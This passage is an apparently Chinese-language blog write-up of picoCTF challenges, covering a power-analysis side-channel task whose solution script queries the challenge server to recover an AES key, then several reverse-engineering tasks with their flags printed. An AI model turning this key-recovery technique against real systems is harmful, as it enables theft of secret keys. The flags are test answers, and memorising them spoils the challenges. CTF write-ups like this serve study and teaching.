<h2 id="PowerAnalysis-Warmup"><a href="#PowerAnalysis-Warmup" class="headerlink" title="PowerAnalysis: Warmup"></a>PowerAnalysis: Warmup</h2><div class="note warning flat"><p>AUTHOR: ANISH SINGHANI</p>
<p>Description<br>This encryption algorithm leaks a “bit” of data every time it does a computation. Use this to figure out the encryption key.<br>Download the encryption program here <code>encrypt.py</code>. Access the running server with <code>nc saturn.picoctf.net 53848</code>.<br>The flag will be of the format <code>picoCTF{&lt;encryption key&gt;}</code> where <code>&lt;encryption key&gt;</code> is 32 lowercase hex characters comprising the 16-byte encryption key being used by the program.<br><strong>200 Points</strong></p>
</div>

<p>這題每次輸入不同的plaintext之後，就會獲得不同的數值，其意義是用來計算所有二進位中1的數量。但基於他的加密算法<code>encrypt()</code>過於簡單，如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> random, sys, time</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;key.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    SECRET_KEY = <span class="built_in">bytes</span>.fromhex(f.read().strip())</span><br><span class="line"></span><br><span class="line">Sbox = (</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line">    <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leaks one bit of information every operation</span></span><br><span class="line">leak_buf = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leaky_aes_secret</span>(<span class="params">data_byte, key_byte</span>):</span><br><span class="line">    out = Sbox[data_byte ^ key_byte]</span><br><span class="line">    leak_buf.append(out &amp; <span class="number">0x01</span>)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment"># Simplified version of AES with only a single encryption stage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    <span class="keyword">global</span> leak_buf</span><br><span class="line">    leak_buf = []</span><br><span class="line">    ciphertext = [leaky_aes_secret(plaintext[i], key[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak the number of 1 bits in the lowest bit of every SBox output</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_and_leak</span>(<span class="params">plaintext</span>):</span><br><span class="line">    ciphertext = encrypt(plaintext, SECRET_KEY)</span><br><span class="line">    ciphertext = <span class="literal">None</span> <span class="comment"># throw away result</span></span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    <span class="keyword">return</span> leak_buf.count(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pt = <span class="built_in">input</span>(<span class="string">&quot;Please provide 16 bytes of plaintext encoded as hex: &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(pt) != <span class="number">32</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Invalid length&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pt = <span class="built_in">bytes</span>.fromhex(pt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leakage result:&quot;</span>, encrypt_and_leak(pt))</span><br></pre></td></tr></table></figure>

<p>因此我們可以很容易地窮舉出在固定plaintext的順序之下，每一位key(共256種，<code>0x00-0xff</code>)所對應的bit leak陣列為何，這裡是將<code>0x00-0xe</code>做為每次改動的plaintext，其餘設為0的條件下，只要將最後得到的整個plaintext陣列減去其中最小值，即可獲得單位key的bit leak，此時再將結果與前面所得到的窮舉比對，便能得到最後的key了。exploit如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">out=[]</span><br><span class="line"></span><br><span class="line">sb=[<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line">    <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">    m=[]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        m.append(sb[j^i]&amp;<span class="number">0x01</span>)</span><br><span class="line">    out.append(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">flage=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    n=[]</span><br><span class="line">    nn=[]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;0&#x27;</span>*((<span class="number">15</span>-i)*<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">        payload+=<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">        payload+=<span class="string">&#x27;0&#x27;</span>*i*<span class="number">2</span></span><br><span class="line">        r=remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>,<span class="number">56284</span>)</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        r.sendline(payload.encode())</span><br><span class="line">        g=<span class="built_in">int</span>(r.recvline().strip()[<span class="number">16</span>:])</span><br><span class="line">        n.append(g)</span><br><span class="line">        r.close()</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> n:</span><br><span class="line">        nn.append(k-<span class="built_in">min</span>(n))</span><br><span class="line">    <span class="built_in">print</span>(nn)</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">        <span class="keyword">if</span> out[l] == nn:</span><br><span class="line">            flage.append(l)</span><br><span class="line"></span><br><span class="line">flage.reverse()</span><br><span class="line"><span class="built_in">print</span>(flage)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> flage]))</span><br></pre></td></tr></table></figure>

<h1 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h1><blockquote>
<p>CLEAR</p>
</blockquote>
<p>這次的Reverse是我兩個破台類別中的其中一個，十分欣慰，因為我最常打的就是Reverse類別了.w.希望以後Reverse可以越打越好!(但其他類別也要加強QAQ)</p>
<h2 id="Ready-Gladiator-0"><a href="#Ready-Gladiator-0" class="headerlink" title="Ready Gladiator 0"></a>Ready Gladiator 0</h2><div class="note success flat"><p>AUTHOR: LT ‘SYREAL’ JONES</p>
<p>Description<br>Can you make a CoreWars warrior that always loses, no ties?<br>Your opponent is the Imp. The source is available here. If you wanted to pit the Imp against himself, you could download the Imp and connect to the CoreWars server like this:<br><code>nc saturn.picoctf.net 64827 &lt; imp.red</code><br><strong>100 Points</strong></p>
</div>

<p>這題題目上大喇喇地寫著CoreWar，首要條件當然就是先知道CoreWar是甚麼囉XD他其實是一個多程式攻擊比賽，多個程式會同時在電腦上運行，並想辦法將其他程式打爛，留下自己。但這裡的CoreWar比較簡單，只要符合他的條件即可。這一題說我們要想辦法讓其中一個warrior 100連敗，沒有平手。因為他原本給的<code>imp.red</code>會造成100次平手，可想而知我們應該要改正他的指令。其實要讓自己100連敗並不是甚麼困難事，只要在遊戲中亂<code>mov</code>就相對容易達到了。以下是原始的指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat imp.red</span><br><span class="line">;redcode</span><br><span class="line">;name Imp Ex</span><br><span class="line">;assert 1</span><br><span class="line">mov 0, 1</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>如果我們<code>mov</code>其他的東西呢?試試以下指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat imp.red</span><br><span class="line">;redcode</span><br><span class="line">;name Imp Ex</span><br><span class="line">;assert 1</span><br><span class="line">mov 0, 0</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>可想而知的，我們成功拿到了100連敗，得到flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ nc saturn.picoctf.net 61590 &lt; imp.red</span><br><span class="line">;redcode</span><br><span class="line">;name Imp Ex</span><br><span class="line">;assert 1</span><br><span class="line">mov 0, 0</span><br><span class="line">end</span><br><span class="line">Submit your warrior: (enter &#x27;end&#x27; when done)</span><br><span class="line"></span><br><span class="line">Warrior1:</span><br><span class="line">;redcode</span><br><span class="line">;name Imp Ex</span><br><span class="line">;assert 1</span><br><span class="line">mov 0, 0</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">Rounds: 100</span><br><span class="line">Warrior 1 wins: 0</span><br><span class="line">Warrior 2 wins: 100</span><br><span class="line">Ties: 0</span><br><span class="line">You did it!</span><br><span class="line">picoCTF&#123;h3r0_t0_z3r0_4m1r1gh7_e1610ed2&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><div class="note success flat"><p>AUTHOR: MUBARAK MIKAIL</p>
<p>Description<br>Try reversing this file? Can ya?<br>I forgot the password to this file. Please find it for me?<br><strong>100 Points</strong></p>
</div>

<p>這題是今年Reverse最簡單的題目，只要<code>strings</code>他就能在裡面找到flag了，但既然他是個password checker，我們還是逆向他一下吧。</p>
<p><img src="https://i.imgur.com/fBwZil2.png"></p>
<p>很明顯的，下面的xor會確認輸入是否一致，而他的password就是<code>v10-v14</code>的字串拼接，也就是flag的一部份…那麼我們就來輸入密碼獲得flag吧(心虛)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./ret</span><br><span class="line">Enter the password to unlock this file: picoCTF&#123;3lf_r3v3r5ing_succe55ful_2f0131a</span><br><span class="line">You entered: picoCTF&#123;3lf_r3v3r5ing_succe55ful_2f0131a</span><br><span class="line">Password correct, please see flag: picoCTF&#123;3lf_r3v3r5ing_succe55ful_2f0131a4&#125;</span><br><span class="line">picoCTF&#123;3lf_r3v3r5ing_succe55ful_2f0131a</span><br></pre></td></tr></table></figure>

<h2 id="Safe-Opener-2"><a href="#Safe-Opener-2" class="headerlink" title="Safe Opener 2"></a>Safe Opener 2</h2><div class="note success flat"><p>AUTHOR: MUBARAK MIKAIL</p>
<p>Description<br>What can you do with this file?<br>I forgot the key to my safe but this file is supposed to help me with retrieving the lost key. Can you help me unlock my safe?<br><strong>100 Points</strong></p>
</div>

<p>其實我不知道為什麼這題是2，但既然他給了就打開看看吧，裡面有一個<code>.class</code>檔案，有看我前幾篇發的Reverse Engineering基礎就知道，java的<code>.class</code>是可以被輕易decompile的吧～所以我們就用線上工具來逆向他，得到的原始碼如下，flag就在裡面：</p>
